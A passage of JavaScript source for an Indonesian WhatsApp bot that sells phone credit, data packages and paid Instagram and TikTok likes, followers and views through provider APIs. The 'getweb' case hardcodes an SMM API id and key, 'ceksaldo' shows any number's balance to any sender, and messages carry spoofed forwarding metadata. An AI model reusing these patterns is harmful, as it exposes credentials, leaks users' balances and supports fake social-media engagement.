      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-1on+":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "1ON+";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-unlimited-nonstop":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Unlimited Nonstop";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-kuota":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Kuota";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-mandiri":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Mandiri";
      	getList(kategori, brand, type);
      }
      break;

      // ----------------- End Smartfren ---------------


      // --------------------- Pulsa By.U -----------------

      case "pulsabyu":
      {
      	const kategori = "Pulsa";
      	const brand = "B.yu";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsabyu-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "B.yu";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "paketbyu":
      {
      	const kategori = "Data";
      	const brand = "B.yu";
      	const type = "Umum";
      	getPaket(kategori, brand, type);
      }
      break;

      // -------------------- End Pulsa By.U -----------

      

      case "daftar":
      {
      	if (cek("id", m.sender) == m.sender)
      		return reply(`Anda Sudah Terdaftar Di Database`);
      	daftarr();
      }
      break;

      case "addsaldo":
      {
      	if (multiowner.includes(cek("id", m.sender))) {
      		var sd = text.split(" ")[0];
      		var noa = text.split(" ")[1];
      		if (!sd || !noa)
      			return reply(
      				`Contoh Penambahan saldo adalah\n#addsaldo 10000 62882007324217`
      				);
      		var add = Number(sd);
      		var koa = noa + "@s.whatsapp.net";
      		sett("+saldo", koa, add);
      		reply(
      			`Penambahan Dengan Nominal ${formatmoney(
      				sd
      				)} Berhasil Di tambah\nSaldo Sekarang Rp. ${formatmoney(cek("saldo", noa + "@s.whatsapp.net"))}`
      			);
      		var nn = `Halo Kak Penambahan saldo dengan jumlah ${formatmoney(
      			sd
      			)} Berhasil di tambahkan di akun anda`;
      		kris.sendMessage(koa, { text: nn });
      	}
      }
      break;
      case "minsaldo":
      {
      	if (multiowner.includes(cek("id", m.sender))) {
      		var sd = text.split(" ")[0];
      		var noa = text.split(" ")[1];
      		if (!sd || !noa)
      			return reply(
      				`Contoh Pengurangan saldo adalah\n#minsaldo 10000 62882007324217`
      				);
      		var add = Number(sd);
      		var koa = noa + "@s.whatsapp.net";
      		// var saldo = formatmoney(cek("saldo", noa + "@s.whatsapp.net"))
      		sett("-saldo", koa, add);
      		reply(
      			`Pengurangan Dengan Nominal ${formatmoney(
      				sd
      				)} Berhasil Di Kurangi Saldo Sekarang Rp. ${formatmoney(cek("saldo", noa + "@s.whatsapp.net"))}`
      			);
      		var nn = `Halo Kak Pengurangan saldo dengan jumlah ${formatmoney(
      			sd
      			)} Berhasil di Di Kurangi di akun anda`;
      		kris.sendMessage(koa, { text: nn });
      	}
      }
      break;
      case "sosmed":
      {
      	if (cek("status_sosmed", m.sender) == false) {
      		return m.reply(
      			`Ada pesanan Sosmed yang belum selesai, silahkan selesaikan transaksi sebelumnya atau tekan *.cancelsosmed* untuk membatalkan.`
      			);
      	}
      	if (cek("status_topup", m.sender) == false) {
      		return m.reply(
      			`Ada pesanan Topup yang belum selesai, silahkan selesaikan transaksi sebelumnya atau tekan *.canceltopup* untuk membatalkan.`
      			);
      	}

      	let sal = `*Format Salah ‼️* 

      	*Contoh Order Sosmed*
      	${prefix}order [kode]|[jumlah]|[link/username]
      	*=> #order 1234|1000|ariepulsa*
      	*-----------------*

      	⚠️ Masukan link / username dengan benar agar tidak terjadi kesalahan saat proses.
      	`;

      	if (!text) return m.reply(sal);

      	let [produk, jumlahh, tujuan] = text.split("|");

      	if (!produk || !jumlahh || !tujuan) {
      		return m.reply(sal);
      	}

      	let uphar = parseFloat(cek("upharga", m.sender)) / 100;
      	if (isNaN(uphar)) {
      		console.error("Nilai uphar tidak valid:", uphar);
      		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
      	}

      	for (let i of sos) {
      		if (i.id == produk) {
      			let harga = parseFloat(i.price);
      			let totalHarga = harga + harga * uphar;
      			let totalOrder = (
      				(totalHarga * parseInt(jumlahh)) / 1000 +
      				100
      				).toFixed(0);

      			if (parseFloat(totalOrder) > cek("saldo", m.sender)) {
      				return m.reply(
      					`Gagal, Tidak Dapat Memproses Pesanan Karena Saldo Tidak Mencukupi\nSilahkan Lakukan Deposit Dahulu\n\nKetik : *deposit*`
      					);
      			}

      			let har = parseFloat(totalOrder);
      			let nama_produkk = i.name;
      			let descc = i.note;

      			sett("-saldo", m.sender, har);
      			sett("price", m.sender, har);
      			sett("product_name", m.sender, nama_produkk);
      			sett("status_sosmed", m.sender, false);
      			sett("tujuan", m.sender, tujuan);
      			sett("buyer_sku_code", m.sender, produk);
      			sett("desc", m.sender, descc);
      			sett("jumlah", m.sender, parseInt(jumlahh));

      			let an = `*📑 RINCIAN TRANSAKSI*

      			*Nama :* ${cek("product_name", m.sender)}
      			*Jumlah :* ${cek("jumlah", m.sender)}
      			*Harga :* Rp ${cek("price", m.sender)}
      			*Tujuan :* ${cek("tujuan", m.sender)}
      			*Deskripsi :* ${cek("desc", m.sender)}

      			Ketik *${prefix}order* untuk Melanjutkan Transaksi
      			Ketik *${prefix}cancelsosmed* untuk Membatalkan pesanan`;

      			return m.reply(an);
      		}
      	}

      	return m.reply(
      		`Maaf, produk *${produk}* tidak ditemukan. Silahkan lihat kode produk di *${prefix}listharga*`
      		);
      }
      break;

      case "order": {
      	if (cek("status_sosmed", m.sender) == true) {
      		return m.reply(
      			`Tidak ada pesanan sebelumnya, silahkan melakukan pembelian produk kembali.`
      			);
      	}
      	if (cek("status_topup", m.sender) == false) {
      		return m.reply(
      			`Perintah ini hanya untuk orderan Sosmed. Silahkan ketik : *konfirmasi* untuk melanjutkan orderan Topup.`
      			);
      	}

      	let kode_buyer = cek("buyer_sku_code", m.sender);
      	let jumlahh = cek("jumlah", m.sender);

      	for (let i of sos) {
      		if (i.id == kode_buyer) {
      			let tujuann = cek("tujuan", m.sender);
      			let harga = cek("price", m.sender);
      			let referdf = cek("reff", m.sender);
      			let ref_no = m.sender.split("@")[0];
      			let namaproduk = cek("product_name", m.sender);

      			const apiURL = "https://irvankedesmm.co.id/api/order";
      			const params = new URLSearchParams({
      				api_id: idsmm,
      				api_key: smm,
      				service: kode_buyer,
      				target: tujuann,
      				quantity: jumlahh,
      			});

      			fetch(apiURL, {
      				method: "POST",
      				body: params,
      				headers: {
      					"Content-Type": "application/x-www-form-urlencoded",
      				},
      			})
      			.then(async (response) => {
      				const responseData = await response.json();

      				if (response.status == 200 && responseData.status == true) {
      					const id = responseData.data.id;
      					const jumlahnya = responseData.data.quantity;

      					m.reply(
      						`*「 Sosmed Berhasil DiProses 」*\n\nReffID : ${id}\nLayanan : ${namaproduk}\nJumlah : ${jumlahh}\nTujuan : ${tujuann}\n\nSimpan Kode ReffIDnya : *${id}* Untuk Mengecek Status Secara Berkala\nKetik : *ceksosmed ${id}*`
      						);
                  // Mengatur ulang data pengguna setelah berhasil
                  sett("product_name", m.sender, "");
                  sett("price", m.sender, 0);
                  sett("tujuan", m.sender, "");
                  sett("desc", m.sender, "");
                  sett("reff", m.sender, "");
                  sett("jumlah", m.sender, "");
                  sett("buyer_sku_code", m.sender, "");
                  sett("status_topup", m.sender, true);
                  sett("status_sosmed", m.sender, true);
              } else {
                  sett("+saldo", m.sender, parseFloat(harga)); // Mengembalikan saldo
                  m.reply(`Gagal Memproses Orderan Sosmed ReffID ${referdf}`);
                  // Mengatur ulang data pengguna setelah gagal
                  sett("product_name", m.sender, "");
                  sett("price", m.sender, 0);
                  sett("tujuan", m.sender, "");
                  sett("desc", m.sender, "");
                  sett("reff", m.sender, "");
                  sett("jumlah", m.sender, "");
                  sett("buyer_sku_code", m.sender, "");
                  sett("status_topup", m.sender, true);
                  sett("status_sosmed", m.sender, true);
              }
          })
      			.catch((error) => {
      				console.error("Error during transaction:", error);
                sett("+saldo", m.sender, parseFloat(harga)); // Mengembalikan saldo
                m.reply(
                	"Gagal, Terjadi Kesalahan Saat Memproses Transaksi. Silakan Coba Lagi."
                	);
                // Mengatur ulang data pengguna setelah gagal
                sett("product_name", m.sender, "");
                sett("price", m.sender, 0);
                sett("tujuan", m.sender, "");
                sett("desc", m.sender, "");
                sett("reff", m.sender, "");
                sett("jumlah", m.sender, "");
                sett("buyer_sku_code", m.sender, "");
                sett("status_topup", m.sender, true);
                sett("status_sosmed", m.sender, true);
            });

            break; // Keluar dari loop setelah menemukan produk
        }
    }
    break;
}
case "ceksosmed": {
	let kodeid = text.split("|")[0];

	if (!kodeid) {
		return m.reply(`Format salah. Gunakan: ${prefix}ceksosmed [ReffID]`);
	}

	let config = {
          method: "POST", // Set the HTTP method to POST
          url: "https://irvankedesmm.co.id/api/status", // Set the target URL
          data: new URLSearchParams({
          	api_id: idsmm,
          	api_key: smm,
          	id: kodeid,
          }),
      };

      axios(config)
      .then((response) => {
      	const data = response.data.data;
      	if (data) {
      		m.reply(
      			`*「 Orderan Sosmed ${data.status} 」*\n\nReffID: ${data.id}\nStart Count: ${data.start_count}\nRemain: ${data.remains}`
      			);
      	} else {
      		m.reply("Tidak ada data yang ditemukan.");
      	}
      })
      .catch((error) => {
      	console.error("Error fetching sosmed order status:", error);
      	m.reply("Terjadi kesalahan saat mengambil data.");
      });

      break;
  }
  case "ceksosmednya":
  {
  	var slo = cek("saldo", m.sender);
  	if (cek("id", m.sender) == null)
  		return reply(
  			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
  			);

  	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*
  	⚝ *I N F O - B O T* ⚝

  	≡ *NamaBot* : ${namabot}
  	≡ *Nama* : ${pushname}
  	≡ *Nomor Owner* : ${owner}
  	≡ *Saldo* : ${formatmoney(slo)}
  	≡ *Role Topup* : ${cek("role", m.sender)}
  	≡ *Role Smm* : ${cek("level", m.sender)}
  	`;
  	let sections = [
  	{
  		title: "List Menu Instagram🧾",
  		highlight_label: "✅",
  		rows: [
  		{
  			title: "Instagram Likes",
  			description: `Displays Instagram Likes`,
  			id: ".instagramlikes",
  		},
  		{
  			title: "Instagram Followers",
  			description: `Displays Folowers ❎`,
  			id: ".instagramfollowers",
  		},
  		{
  			title: "Instagram Views",
  			description: `Displays InstagramViews ❎`,
  			id: ".instagramviews",
  		},
  		],
  	},
  	];
  	let listMessage = {
  		title: "Menu Disini",
  		sections,
  	};

  	let msg = generateWAMessageFromContent(
  		m.chat,
  		{
  			viewOnceMessage: {
  				message: {
  					messageContextInfo: {
  						deviceListMetadata: {},
  						deviceListMetadataVersion: 2,
  					},
  					interactiveMessage: proto.Message.InteractiveMessage.create({
  						contextInfo: {
  							mentionedJid: [m.sender],
  							isForwarded: true,
  							forwardedNewsletterMessageInfo: {
  								newsletterJid: "bjirr@newsletter",
  								newsletterName: `Powered By ${newslatter}`,
  								serverMessageId: -1,
  							},
  							businessMessageForwardInfo: {
  								businessOwnerJid: kris.decodeJid(kris.user.id),
  							},
  						},
  						body: proto.Message.InteractiveMessage.Body.create({
  							text: Anu,
  						}),
  						footer: proto.Message.InteractiveMessage.Footer.create({
  							text: botname,
  						}),
  						header: proto.Message.InteractiveMessage.Header.create({
  							title: ``,
  							subtitle: "ownername",
  							hasMediaAttachment: true,
  							...(await prepareWAMessageMedia(
  							{
  								image: {
  									url: "https://iili.io/dbQBob9.md.jpg",
  								},
  							},
  							{ upload: kris.waUploadToServer }
  							)),
  						}),
  						nativeFlowMessage:
  						proto.Message.InteractiveMessage.NativeFlowMessage.create(
  						{
  							buttons: [
  							{
  								name: "single_select",
  								buttonParamsJson: JSON.stringify(listMessage),
  							},
  							{
  								name: "cta_copy",
  								buttonParamsJson: JSON.stringify({
  									display_text: "copy code",
  									copy_code: `${cek("buyer_sku_code", m.sender)}`,
  								}),
  							},
  							{
  								name: "cta_url",
  								buttonParamsJson:
  								`{"display_text":"Creator","url":"https://wa.me/${owner}","merchant_url":"https://wa.me/${owner}"}`,
  							},
  							],
  						}
  						),
  					}),
  				},
  			},
  		},
  		{}
  		);

  	await kris.relayMessage(msg.key.remoteJid, msg.message, {
  		messageId: msg.key.id,
  	});
  }
  break;
  case "cancelsosmed": {
  	if (cek("status_sosmed", m.sender) == true) {
  		return m.reply(
  			`Tidak ada pesanan sosmed sebelumnya, silahkan melakukan pembelian produk kembali.`
  			);
  	}
  	if (cek("status_topup", m.sender) == false) {
  		return m.reply(
  			`Perintah ini bukan untuk orderan sosmed. Silahkan ketik : *canceltopup* untuk membatalkan orderan topup.`
  			);
  	}

  	let harga = cek("price", m.sender);
  	if (!harga || harga === 0) {
  		return m.reply(
  			`Tidak ada harga yang ditemukan untuk pembatalan. Pastikan ada pesanan topup yang valid.`
  			);
  	}

        sett("+saldo", m.sender, parseFloat(harga)); // Mengembalikan saldo pengguna
        sett("status_sosmed", m.sender, true);
        sett("product_name", m.sender, "");
        sett("price", m.sender, 0);
        sett("tujuan", m.sender, "");
        sett("desc", m.sender, "");
        sett("reff", m.sender, "");
        sett("buyer_sku_code", m.sender, "");

        let echa = `🗯️ SUKSES MEMBATALKAN PESANAN SOSMED`;
        m.reply(echa);
        break;
    }
    case "instagramlikes":
    case "ilikes": {
    	const fs = require("fs");
    	let dataInstagramLikes;

    	try {
    		dataInstagramLikes = JSON.parse(
    			fs.readFileSync("./Pengaturan/database/datasmm.json")
    			);
    	} catch (error) {
    		console.error("Gagal membaca file:", error);
    		return m.reply("Gagal membaca data. Silakan coba lagi nanti.");
    	}

    	let uphar = parseFloat(cek("upharga", m.sender)) / 100;
    	if (isNaN(uphar)) {
    		console.error("Nilai uphar tidak valid:", uphar);
    		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
    	}

    	let lev = `${cek("level", m.sender)}`;
    	dataInstagramLikes.sort(
    		(a, b) => parseFloat(a.harga) - parseFloat(b.harga)
    		);

    	let listProductInstagramLikes = "「 *LIST INSTAGRAM LIKES* 」\n";

    	dataInstagramLikes.forEach(function (product) {
    		if (product.category == "[IG] Instagram Likes") {
    			let harga = parseFloat(product.price);
            let hargaFinal = (harga + harga * uphar + 100).toFixed(0); // Hitung harga dengan persentase uphar dan tambahkan biaya tetap
            listProductInstagramLikes += `=> ${product.name}\n`;
            listProductInstagramLikes += `=> Level: ${lev}\n`;
            listProductInstagramLikes += `=> Harga: Rp ${hargaFinal}\n`;
            listProductInstagramLikes += `=> *Kode : ${product.id}*\n`;
            listProductInstagramLikes += `=> Min : ${product.min}\n`;
            listProductInstagramLikes += `=> Max : ${product.max}\n`;
            listProductInstagramLikes += `=> Catatan : ${product.note}\n`;
            listProductInstagramLikes += `=> Status : 🟢\n`;
            listProductInstagramLikes += `=> Kategori : ${product.category}\n`;
            listProductInstagramLikes += `=> Ketik : sosmed ${product.id}|Link/Username\n\n`;
        }
    });

    	m.reply(listProductInstagramLikes);
    	break;
    }
    case "tiktokview":
    case "ttview": {
    	const fs = require("fs");
    	let data10;
    	try {
    		data10 = JSON.parse(
    			fs.readFileSync("./Pengaturan/database/datasmm.json")
    			);
    	} catch (error) {
    		console.error("Gagal membaca file:", error);
    		return m.reply("Gagal membaca data. Silakan coba lagi nanti.");
    	}

    	let uphar = parseFloat(cek("upharga", m.sender)) / 100;
    	if (isNaN(uphar)) {
    		console.error("Nilai uphar tidak valid:", uphar);
    		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
    	}

    	let lev = `${cek("level", m.sender)}`;
    	data10.sort((a, b) => parseFloat(a.harga) - parseFloat(b.harga));

    	let listProduct10 = "「 *LIST TIKTOK VIEW* 」\n";

    	data10.forEach(function (product) {
    		if (product.category === "[TK] Tiktok Views") {
    			let harga = parseFloat(product.price);
            let hargaFinal = (harga + harga * uphar + 100).toFixed(0); // Hitung harga dengan persentase uphar dan tambahkan biaya tetap
            listProduct10 += `=> ${product.name}\n`;
            listProduct10 += `=> Level: ${lev}\n`;
            listProduct10 += `=> Harga: Rp ${hargaFinal}\n`;
            listProduct10 += `=> *Kode : ${product.id}*\n`;
            listProduct10 += `=> Min : ${product.min}\n`;
            listProduct10 += `=> Max : ${product.max}\n`;
            listProduct10 += `=> Catatan : ${product.note}\n`;
            listProduct10 += `=> Status : 🟢\n`;
            listProduct10 += `=> Kategori : ${product.category}\n`;
            listProduct10 += `=> Ketik : sosmed ${product.id}|Link/Username\n\n`;
        }
    });
    	m.reply(listProduct10);

    	break;
    }
    case "yes":
    {
    	if (cek("id", m.sender) == null)
    		return reply(
    			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
    			);
    	if (cek("status", m.sender) == true)
    		return reply(
    			`Tidak ada pesanan sebelumnya silahkan melakukan pembelian produk kembali.`
    			);
    	let kode_buyer = `${cek("kode_layanan", m.sender)}`;
    	let ll = cek("saldo", m.sender);
    	let tujuan = `${cek("tujuan", m.sender)}`;
    	let harga = `${cek("harga", m.sender)}`;
    	let tgl_trx = `${tanggal + jam}`;
    	sett("-saldo", m.sender, harga);
    	let referdf = `${cek("reff", m.sender)}`;
    	let ref_no = `${sender.split("@")[0]}`;
    	let namaproduk = `${cek("layanan", m.sender)}`;
    	let nomor = `${tujuan}`;
    	let harga_produk = `${harga}`;
    	let kode_produk = `${kode_buyer}`;

    	var hrga = Number(harga_produk);
    	const signature = crypto
    	.createHash("md5")
    	.update(digiuser + digiapi + referdf)
    	.digest("hex");
    	var config = {
    		method: "POST",
    		url: "https://api.digiflazz.com/v1/transaction",
    		data: {
    			username: digiuser,
    			buyer_sku_code: kode_buyer,
    			customer_no: tujuan,
    			ref_id: referdf,
    			sign: signature,
    		},
    	};
    	axios(config)
    	.then(async (res) => {
    		m.reply(`*── 「 Transaksi Di Prosess 」 ──*`);

    		let status = res.data.data.status;
    		console.log(status);
    		while (status !== "Sukses") {
    			await sleep(1000);
    			const response = await axios(config);
    			status = response.data.data.status;
    			if (status == "Gagal") {
    				sett("+saldo", m.sender, hrga);

    				reply(
    					`   *${toko}*\n` +
    					`❌ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ❌\n\n` +
    					`═════════════════════\n` +
    					`> ID : ${tanggal} - ${jam}\n` +
    					`> Layanan : ${namaproduk}\n` +
    					`> Data : ${tujuan}\n` +
    					`> Harga : ${formatmoney(harga_produk)}\n` +
    					`> Message : ${response.data.data.message}\n` +
    					`═════════════════════\n\n` +
    					`Terima kasih atas transaksi Anda! 😊`
    					);


    				kris.sendMessage(nomorKu, {
    					text: `*Transaksi Gagal Produk:* ${namaproduk}\n${response.data.data.message}`,
    				});
    				break;
    			}
    			if (status == "Sukses") {
    				const trxFilePath = "./Pengaturan/database/datatrx.json";
    				const trxUserData = JSON.parse(
    					fs.readFileSync(trxFilePath, "utf8")
    					);
    				const waktu = cekWaktu();
    				const newTransactionData = {
    					buyer: m.sender,
    					status: response.data.data.message,
    					ref_id: response.data.data.ref_id,
    					jam: moment.tz("Asia/Jakarta").format("HH:mm:ss"),
    					date: waktu,
    					produk: namaproduk,
    					harga_modal: response.data.data.price,
    					harga: harga_produk,
    					tujuan: tujuan,
    					invoice: response.data.data.sn,
    				};
    				trxUserData.push(newTransactionData);
    				fs.writeFileSync(
    					trxFilePath,
    					JSON.stringify(trxUserData, null, 2),
    					"utf8"
    					);
    				reply(
    					`   *${toko}*\n` +
    					`✅ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ✅\n\n` +
    					`═════════════════════\n` +
    					`> ID : ${tanggal} - ${jam}\n` +
    					`> Layanan : ${namaproduk}\n` +
    					`> Data : ${tujuan}\n` +
    					`> Harga : ${formatmoney(harga_produk)}\n` +
    					`> SN : ${response.data.data.sn}\n` +
    					`═════════════════════\n\n` +
    					`Terima kasih atas transaksi Anda! 😊`
    					);

    				break;
    			}
    		}
    	})
    	.catch((error) => {
    		if (error.response) {
    			sett("+saldo", m.sender, hrga);

    			reply(
    				`   *${toko}*\n` +
    				`❌ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${error.response.data.data.status}) ❌\n\n` +
    				`═════════════════════\n` +
    				`> ID : ${tanggal} - ${jam}\n` +
    				`> Layanan : ${namaproduk}\n` +
    				`> Tujuan : ${nomor}\n` +
    				`> Harga : ${formatmoney(harga_produk)}\n` +
    				`> Message : ${error.response.data.data.message}\n` +
    				`═════════════════════\n\n` +
    				`Terima kasih atas transaksi Anda! 😊`
    				);

    			kris.sendMessage(nomorKu, {
    				text: `*Transaksi Gagal Produk:* ${namaproduk}\n${error.response.data.data.message}`,
    			});
    		}
    	});
    	sett("layanan", m.sender, "");
    	sett("harga", m.sender, 0);
    	sett("tujuan", m.sender, "");
    	sett("desc", m.sender, "");
    	sett("reff", m.sender, "");
    	sett("kode_produk", m.sender, "");
    	sett("status", m.sender, true);
    }
    break;
    case "ceksaldo":
    {
    	reply(`*Saldo :*  ${formatmoney(cek("saldo", text.split(" ") + "@s.whatsapp.net"))}`)
    }
    break;
    case "saldo":
    {
    	const filePath = "./Pengaturan/database/datatrx.json";
          const targetUser = m.sender; // Nomor pengguna yang ingin diperiksa

          try {
            // Read the JSON file
            const fileData = fs.readFileSync(filePath, "utf8");
            const allTransactions = JSON.parse(fileData);

            if (allTransactions.length === 0) {
            	return reply("Tidak Ditemukan Data Transaksi");
            }

            // Filter transaksi berdasarkan nomor pengguna target
            const userTransactions = allTransactions.filter((data) =>
            	data.buyer.includes(targetUser)
            	);

            // Menghitung total transaksi dan total belanja untuk pengguna target
            let totalTransaksi = 0;
            let totalBelanja = 0;

            userTransactions.forEach((data) => {
            	totalTransaksi += parseFloat(data.harga);
              totalBelanja += 1; // Setiap transaksi menambah 1 ke total belanja
          });

            // Membuat pesan balasan dengan detail akun, saldo, total transaksi, dan total belanja untuk pengguna target
            let myde = 
            `*───「 DETAIL AKUN 」───*\n\n` +
            `*○*  *Name:* ${pushname}\n` +
            `*○*  *Id:* ${sender.replace("@s.whatsapp.net", "")}\n` +
            `*○*  *Saldo:* ${formatmoney(cek("saldo", m.sender))}\n` +
            `*○*  *Total Transaksi:* ${formatmoney(totalTransaksi)}\n` +
            `*○*  *Total Belanja:* ${totalBelanja}\n\n` +
            `𝘐𝘯𝘨𝘪𝘯 𝘥𝘦𝘱𝘰𝘴𝘪𝘵 𝘴𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘬𝘦𝘵𝘪𝘬 𝘤𝘰𝘮𝘮𝘢𝘯𝘥 *.𝘥𝘦𝘱𝘰𝘴𝘪𝘵*`;

            // Mengirimkan pesan dengan detail akun dan transaksi untuk pengguna target
            reply(myde);
        } catch (error) {
        	console.error("Error reading the transaction history file:", error);
        	reply("Error, Tidak dapat membaca data");
        }
    }
    break;

    case "getweb":
    {
    	if (!isOwner) return reply(mess.owner);
          let apiid_smm = "47146"; //ganti apiid smm anda
          let apikey_smm = "wc3hpq-sgqq8t-0ilwm1-uf6rnq-vwqhda";
          reply(`Bot Sedang Memperoses silahkan cek di console gagal/Sukses`);
          getWeb(apiid_smm, apikey_smm);
      }
      break;
      case "getdigi":
      {
      	// if (!isOwner) return reply(mess.owner);

      	if (!multiowner.includes(cek("id", m.sender))) return reply(mess.owner);
      	var kak = `${digiuser}`;
      	var lak = `${digiapi}`;
      	reply(`Bot Sedang Memperoses silahkan cek di console gagal/Sukses`);
      	// getProduk(digiuser, digiapi);
      	try {
      		const produk = await getProduk(digiuser, digiapi);
      		// console.log("Produk:", produk);
      		if(produk !== null) {
      			reply(`_Berhasil update data terbaru_`);

      		}
      	} catch (error) {
      		console.error("Error:", error);
      		reply(
      			`Terjadi kesalahan saat mengambil produk. Silahkan cek di console.`
      			);
      	}
      }
      break;
      case "saldoweb":
      {
      	if (m.isGroup) return m.reply("Fitur Khusus Private Chat");
      	if (!isOwner) return m.reply("Fitur khusus owner!");
      	const crypto = require("crypto");
      	const axios = require("axios");
      	// const apiidsmm = global.apiidsmm;
      	// const apikeysmm = global.apikeysmm;

      	var config = {
            method: "POST", // Set the HTTP method to POST
            url: "https://irvankedesmm.co.id/api/profile", // Set the target URL
            data: {
            	api_id: global.apiidsmm,
            	api_key: global.apikeysmm,
            },
        };

        axios(config)
        .then(function (response) {
        	if (response.data.data) {
        		m.reply(`*「 CEK SALDO SMM Pusat 」*
        			› STATUS IRVANKEDE : *TERHUBUNG*
        			› Email Akun Server : *${response.data.data.email}*\n
        			› SALDO SERVER : ${response.data.data.balance}\n`);
        	} else {
        		m.reply(`*「 AKUN DIGIFLAZZ 」*\n
        			*Server Terputus Mohon Untuk Mengecek Providernya Kembali*.\n`);
        	}
        })
        .catch(function (error) {
        // Menangani kesalahan di sini
        console.error('Kesalahan Axios:', error.message);
        m.reply(`Terjadi kesalahan saat mencoba mengambil data. Silakan coba lagi nanti.`);
    });
    }
    break;
    case "saldosmm2":
    {
    	if (m.isGroup) return m.reply("Fitur Khusus Private Chat");
    	if (!isOwner) return m.reply("Fitur khusus owner!");
    	const crypto = require("crypto");
    	const axios = require("axios");
    	var config = {
            method: "POST", // Set the HTTP method to POST
            url: "https://buzzerpanel.id/api/json.php", // Set the target URL
            data: new URLSearchParams(
            	Object.entries({
            		api_key: smmm,
            		secret_key: idsmmm,
            		action: "profile",
            	})
            	),
        };

        axios(config).then(function (response) {
        	if (response.data.status == true) {
        		m.reply(
        			`*「 AKUN SMM BUZZERPANEL 」*\n\n` +
        			`› STATUS BUZZERPANEL: *TERHUBUNG*\n` +
        			`› EMAIL SERVER: *${response.data.data.email}*\n` +
        			`› Username SERVER: *${response.data.data.username}*\n` +
        			`› FullName SERVER: *${response.data.data.full_name}*\n` +
        			`› SALDO SERVER: *Rp ${formatmoney(response.data.data.balance)}*\n`
        			);

        	}
        	if (response.data.status == false) {
        		m.reply(
        			`*「 AKUN SMM IRVANKEDE 」*\n\n› STATUS IRVANKEDE : *TERPUTUS*\n› PESAN : *${response.data.data.msg}*\n`
        			);
        	}
        });
    }
    break;
    case "saldosmm":
    {
    	if (m.isGroup) return m.reply("Fitur Khusus Private Chat");
    	if (!isOwner) return m.reply("Fitur khusus owner!");
    	const crypto = require("crypto");
    	const axios = require("axios");
    	var config = {
            method: "POST", // Set the HTTP method to POST
            url: "https://irvankedesmm.co.id/api/profile", // Set the target URL
            data: new URLSearchParams(
            	Object.entries({
            		api_id: idsmm,
            		api_key: smm,
            	})
            	),
        };

        axios(config).then(function (response) {
        	if (response.data.status == true) {
        		m.reply(
        			`*「 AKUN SMM IRVANKEDE 」*\n\n› STATUS IRVANKEDE : *TERHUBUNG*\n›EMAIL SERVER  : *${
        				response.data.data.email
        			}*\n› SALDO SERVER : *Rp.     ${formatmoney(
        				response.data.data.balance
        				)}*\n`
        			);
        	}
        	if (response.data.status == false) {
        		m.reply(
        			`*「 AKUN SMM IRVANKEDE 」*\n\n› STATUS IRVANKEDE : *TERPUTUS*\n› PESAN : *${response.data.data.msg}*\n`
        			);
        	}
        });
    }
    break;
    case "saldodigi":
    {
    	if (m.isGroup) return m.reply("Fitur Khusus Private Chat");
    	if (!isOwner) return m.reply("Fitur khusus owner!");
    	const crypto = require("crypto");
    	const axios = require("axios");
    	let third = "depo";
    	let hash = crypto
    	.createHash("md5")
    	.update(digiuser + digiapi + third)
    	.digest("hex");

    	var config = {
            method: "POST", // Set the HTTP method to POST
            url: "https://api.digiflazz.com/v1/cek-saldo", // Set the target URL
            data: {
            	cmd: "deposit",
            	username: digiuser,
            	sign: hash,
            },
        };

        axios(config).then(function (response) {
        	if (response.data.data) {
        		m.reply(
        			`*「 CEK SALDO DIGIFLAZZ 」*\n\n` +
        			`› STATUS DIGIFLAZZ : *TERHUBUNG*\n` +
        			`› SALDO SERVER : *${formatmoney(response.data.data.deposit)}*\n`
        			);
        	} else {
        		m.reply(
        			`*「 AKUN DIGIFLAZZ 」*\n\n` +
        			`*Server Terputus Mohon Untuk Mengecek Providernya Kembali*.\n`
        			);
        	}

        });
    }
    break;
    case "resetlayanan": {
    	if (!isOwner) return m.reply(mess.owner);
    	const filePath = "./Pengaturan/database/datadigiflaz.json";
    	const filePath2 = "./Pengaturan/database/datasmm.json";

    	try {
          // Write an empty array to the file
          fs.writeFileSync(filePath, "[]", "utf8");
          fs.writeFileSync(filePath2, "[]", "utf8");
          m.reply("Sip, Berhasil Menghapus Layanan Topup Dan Sosmed");
      } catch (error) {
      	console.error("Error resetting data:", error);
      	m.reply("An error occurred while resetting data.");
      }

      break;
  }
  case "getip": {
  	if (!isOwner) return reply(mess.owner);
  	m.reply("My public IP address is: " + ipserver);
  	break;
  }
  case "restart": {
  	if (!isOwner) {
  		return m.reply(mess.owner);
  	}
  	await m.reply(`_Restarting ${packname}_`);
  	try {
  		await kris.sendMessage(from, { text: "*_Succes_*" });
  		await sleep(3000);
  		exec(`npm start`);
  	} catch (err) {
  		exec(`node index.js`);
  		await sleep(4000);
  		m.reply("*_Sukses_*");
  	}
  	break;
  }
  case "rekapsaldo": {
  	const moment = require("moment");
  	if (!isOwner) return;
  	if (cek("id", m.sender) == null) return reply("Maaf Anda Belum Daftar");

  	const filePath = "./Pengaturan/database/user.json";

  	try {
  		const fileData = fs.readFileSync(filePath, "utf8");
  		const allUserData = JSON.parse(fileData);

  		if (allUserData.length === 0) {
  			return reply("Tidak Ditemukan Data Transaksi");
  		}
  		const userSaldoSummary = {};
  		let totalSaldoSemuaPengguna = 0;
